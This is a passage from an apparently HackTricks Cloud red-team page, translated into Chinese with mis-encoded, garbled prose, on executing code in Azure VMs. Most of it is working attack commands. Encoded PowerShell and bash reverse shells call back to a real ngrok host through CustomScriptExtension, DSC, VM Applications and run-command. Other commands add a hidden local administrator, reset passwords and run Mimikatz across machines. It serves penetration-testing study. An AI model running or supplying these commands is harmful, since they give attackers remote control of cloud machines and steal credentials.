echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* ä»æ–‡ä»¶æ‰§è¡Œåå‘ shell

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

æ‚¨è¿˜å¯ä»¥æ‰§è¡Œå…¶ä»–æœ‰æ•ˆè´Ÿè½½ï¼Œä¾‹å¦‚ï¼š `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* ä½¿ç”¨ VMAccess æ‰©å±•é‡ç½®å¯†ç 

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### ç›¸å…³çš„è™šæ‹Ÿæœºæ‰©å±•

æ‰€éœ€çš„æƒé™ä»ç„¶æ˜¯ **`Microsoft.Compute/virtualMachines/extensions/write`**ã€‚

<details>

<summary>VMAccess æ‰©å±•</summary>

æ­¤æ‰©å±•å…è®¸ä¿®æ”¹ Windows è™šæ‹Ÿæœºå†…ç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–åœ¨ä¸å­˜åœ¨æ—¶åˆ›å»ºå¯†ç ï¼‰ã€‚

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

è¿™æ˜¯ä¸€ä¸ªå±äºå¾®è½¯çš„**è™šæ‹Ÿæœºæ‰©å±•**ï¼Œä½¿ç”¨ PowerShell DSC æ¥ç®¡ç† Azure Windows è™šæ‹Ÿæœºçš„é…ç½®ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡æ­¤æ‰©å±•åœ¨ Windows è™šæ‹Ÿæœºä¸­**æ‰§è¡Œä»»æ„å‘½ä»¤**ï¼š
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

<summary>æ··åˆè¿è¡Œç°¿å·¥ä½œè€…</summary>

è¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºæ‰©å±•ï¼Œå…è®¸ä»è‡ªåŠ¨åŒ–å¸æˆ·åœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡Œè¿è¡Œç°¿ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[è‡ªåŠ¨åŒ–å¸æˆ·æœåŠ¡](../az-automation-account/)ã€‚

</details>

### è™šæ‹Ÿæœºåº”ç”¨ç¨‹åº

è¿™äº›æ˜¯åŒ…å«æ‰€æœ‰**åº”ç”¨ç¨‹åºæ•°æ®å’Œå®‰è£…åŠå¸è½½è„šæœ¬**çš„åŒ…ï¼Œå¯ç”¨äºè½»æ¾åœ°åœ¨è™šæ‹Ÿæœºä¸­æ·»åŠ å’Œåˆ é™¤åº”ç”¨ç¨‹åºã€‚

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

è¿™äº›æ˜¯åº”ç”¨ç¨‹åºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¸‹è½½çš„è·¯å¾„ï¼š

* Linux: `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows: `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

æŸ¥çœ‹å¦‚ä½•å®‰è£…æ–°åº”ç”¨ç¨‹åºåœ¨ [https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)

{% hint style="danger" %}
å¯ä»¥**ä¸å…¶ä»–è®¢é˜…æˆ–ç§Ÿæˆ·å…±äº«å•ä¸ªåº”ç”¨ç¨‹åºå’Œç”»å»Š**ã€‚è¿™éå¸¸æœ‰è¶£ï¼Œå› ä¸ºè¿™å¯èƒ½å…è®¸æ”»å‡»è€…åœ¨åº”ç”¨ç¨‹åºä¸­æ¤å…¥åé—¨ï¼Œå¹¶è½¬å‘å…¶ä»–è®¢é˜…å’Œç§Ÿæˆ·ã€‚
{% endhint %}

ä½†æ˜¯**æ²¡æœ‰åƒæ‰©å±•é‚£æ ·çš„ vm åº”ç”¨ç¨‹åºâ€œå¸‚åœºâ€**ã€‚

æ‰€éœ€çš„æƒé™æ˜¯ï¼š

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

åˆ©ç”¨ç¤ºä¾‹ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### ç”¨æˆ·æ•°æ®

è¿™æ˜¯**æŒä¹…æ•°æ®**ï¼Œå¯ä»¥éšæ—¶ä»å…ƒæ•°æ®ç«¯ç‚¹æ£€ç´¢ã€‚è¯·æ³¨æ„ï¼Œåœ¨Azureä¸­ï¼Œç”¨æˆ·æ•°æ®ä¸AWSå’ŒGCPä¸åŒï¼Œå› ä¸º**å¦‚æœæ‚¨åœ¨è¿™é‡Œæ”¾ç½®è„šæœ¬ï¼Œå®ƒä¸ä¼šé»˜è®¤æ‰§è¡Œ**ã€‚

### è‡ªå®šä¹‰æ•°æ®

å¯ä»¥å°†ä¸€äº›æ•°æ®ä¼ é€’ç»™VMï¼Œè¿™äº›æ•°æ®å°†å­˜å‚¨åœ¨é¢„æœŸè·¯å¾„ä¸­ï¼š

* åœ¨**Windows**ä¸­ï¼Œè‡ªå®šä¹‰æ•°æ®ä»¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å½¢å¼æ”¾ç½®åœ¨`%SYSTEMDRIVE%\AzureData\CustomData.bin`ä¸­ï¼Œå¹¶ä¸”ä¸ä¼šè¢«å¤„ç†ã€‚
* åœ¨**Linux**ä¸­ï¼Œå®ƒå­˜å‚¨åœ¨`/var/lib/waagent/ovf-env.xml`ä¸­ï¼Œç°åœ¨å­˜å‚¨åœ¨`/var/lib/waagent/CustomData/ovf-env.xml`ä¸­ã€‚
* **Linuxä»£ç†**ï¼šé»˜è®¤æƒ…å†µä¸‹ä¸å¤„ç†è‡ªå®šä¹‰æ•°æ®ï¼Œéœ€è¦å¯ç”¨æ•°æ®çš„è‡ªå®šä¹‰æ˜ åƒã€‚
* **cloud-initï¼š** é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå¤„ç†è‡ªå®šä¹‰æ•°æ®ï¼Œè¿™äº›æ•°æ®å¯ä»¥æ˜¯[**å¤šç§æ ¼å¼**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html)ã€‚å®ƒå¯ä»¥è½»æ¾æ‰§è¡Œè„šæœ¬ï¼Œåªéœ€åœ¨è‡ªå®šä¹‰æ•°æ®ä¸­å‘é€è„šæœ¬ã€‚
* æˆ‘å°è¯•è¿‡ï¼ŒUbuntuå’ŒDebianéƒ½ä¼šæ‰§è¡Œæ‚¨æ”¾ç½®åœ¨è¿™é‡Œçš„è„šæœ¬ã€‚
* ä¹Ÿä¸éœ€è¦å¯ç”¨ç”¨æˆ·æ•°æ®ä»¥ä¾¿æ‰§è¡Œæ­¤æ“ä½œã€‚
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **è¿è¡Œå‘½ä»¤**

è¿™æ˜¯ Azure æä¾›çš„æœ€åŸºæœ¬æœºåˆ¶ï¼Œç”¨äº **åœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚æ‰€éœ€æƒé™ä¸º `Microsoft.Compute/virtualMachines/runCommand/action`ã€‚

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## æƒé™æå‡

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## æœªç»èº«ä»½éªŒè¯çš„è®¿é—®

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## åˆ©ç”¨åçš„æ“ä½œ

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## æŒä¹…æ€§

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
